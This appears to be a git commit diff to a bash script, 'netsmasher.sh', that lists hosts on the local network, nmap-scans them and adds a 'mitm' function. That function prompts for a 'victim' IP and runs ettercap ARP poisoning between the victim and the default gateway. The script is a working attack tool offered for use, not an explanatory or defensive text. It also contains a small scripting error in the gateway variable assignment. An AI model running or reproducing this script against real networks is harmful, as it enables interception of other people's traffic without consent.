f903e5720860c6ab90e36d08e6e878592697f693
Passhyk <70662829+Passhyk@users.noreply.github.com>
2021-04-22 13:13:59 +0300

    bug fixes and mitm

--- netsmasher.sh
+++ netsmasher.sh
@@ -22,36 +22,29 @@ function myip(){
 ifconfig | grep "inet 192." | cut -c 13-26 
 }
 
-banner
+
 
  
-printf "\n [ips listed below are in your network!]\n\n"
-ip
 
-printf "\n [your ip is:]\n\n" 
-myip 
-
-echo -e "\n\n[hit enter to continue] "
-read -p ' ' ohayogosayumasu
-
-scan(){
-echo -e "\n [do you want to also scan these fellows?]"
+         
+function scan(){
+echo -e "\n [do you want to scan these fellows?]"
 read -p $'THEN   yes/no  >_: ' bakayaro
 if [[ "$bakayaro" == "yes" ]]; then
         clear
         
-        ip > scan.txt 
+
         echo -e "\nSCANNING ..."
         
         cat scan.txt
         echo -e "SCANNING ..."
-        echo -e "\n\n[created a text file of ip addresses]\n "
+
         read -p '[hit enter to continue]' konichiwagosayumasu
         for ip in $(cat scan.txt);
         do nmap -p 80 -T4 $ip &
        
         
-        read -p ' '
+        
         done
     elif [[ "$bakayaro" == "no" ]]; then
         echo -e "LEAVING ..."
@@ -63,4 +56,51 @@ if [[ "$bakayaro" == "yes" ]]; then
 fi
 }
 
+
+
+mitm(){
+
+echo -e "[do you want to mitm these fellows?]"
+read -p $'THEN   yes/no  >_: ' ahodaro
+if [[ "$ahodaro" == "yes" ]]; then
+	clear
+	
+	cat scan.txt
+	echo -e "[type victim's ip address:]"
+	read -p $'>_:' victim
+	
+	 default= $(ip route | grep "default" | cut -d " " -f 3); 
+	sudo ettercap -T -S -i wlo1 -M arp:remote /$default// /$victim// 
+	
+	 
+elif [[ "$ahodaro" == "no" ]]; then
+  echo -e "LEAVING ..."
+
+        exit 0
+
+else
+            echo -e "\n INVALID VALUE!"
+   	    mitm
+fi
+}
+
+banner
+printf "\n [ips listed below are in your network!]\n\n"
+ip
+
+printf "\n [your ip is:]\n\n" 
+myip 
+	
+echo -e "\n\n[hit enter to continue] "
+read -p $' ' ohayogosayumasu
+
+	ip > scan.txt
+        echo -e "\n\n[created a text file of ip addresses]\n "        
 scan
+read -p ''
+mitm
+read -p ''
+
+
+
+
